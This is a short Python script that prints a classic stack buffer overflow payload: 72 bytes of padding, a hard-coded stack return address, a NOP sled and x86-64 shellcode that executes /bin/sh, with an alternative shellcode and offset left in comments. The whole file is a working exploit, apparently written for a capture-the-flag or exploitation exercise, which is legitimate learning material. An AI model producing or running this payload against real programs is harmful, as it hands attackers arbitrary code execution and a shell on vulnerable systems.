#!python

import sys
import struct

def sp(args):
    sys.stdout.buffer.write(args)

shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

stack = struct.pack("L",0x7fffffffdf28+26)
nop = b"\x90"*20

sp("A".encode()*72 + stack + nop + shellcode + nop)
# sp("A".encode()*71 + stack + nop + shellcode + nop)
